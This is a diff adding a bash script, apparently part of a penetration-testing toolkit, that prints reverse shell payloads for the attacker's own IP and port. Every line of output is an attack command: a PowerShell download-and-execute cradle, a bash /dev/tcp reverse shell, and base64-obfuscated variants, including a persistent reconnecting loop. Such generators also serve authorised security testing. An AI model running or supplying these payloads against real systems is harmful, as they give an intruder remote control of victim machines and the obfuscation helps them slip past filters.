@@ -1,0 +1,36 @@
+#!/bin/bash
+
+lhost=$(getmyip)
+lport=$1
+if [ -z "$lport" ]; then
+  echo LPORT is empty
+  echo "Usage: $0 [LPORT]"
+  export lport=1234
+fi
+
+draw_title_bar "windows rev shell"
+
+echo "# Powershell execute script (like a reverse shell)" | lolcat
+echo "IEX(New-Object Net.WebClient).downloadString( \"http://$lhost:$lport/filename.ps1\" )"
+echo ""
+
+draw_title_bar "linux rev shell"
+
+bashshell=$(echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1")
+echo "$bashshell"
+echo "bash -c '$bashshell'"
+
+# optimize base64 to contain no special chars
+echo ""
+echo "optimizing base 64..."
+alnumb64=$(find-alnum-base64 "$bashshell" | head -n 1)
+echo "echo $alnumb64|base64 -d|bash"
+echo ""
+echo "optimizing while loop reverse shell"
+alnumb64=$(find-alnum-base64 "while [ 1 ]; do sleep 1; bash -c '$bashshell'; done" | head -n 1)
+echo "echo $alnumb64|base64 -d|bash"
+
+# i used to print file transfer commands here as well
+#downloadfiles "http://$lhost:$lport/filename.exe"
+
+echo ""
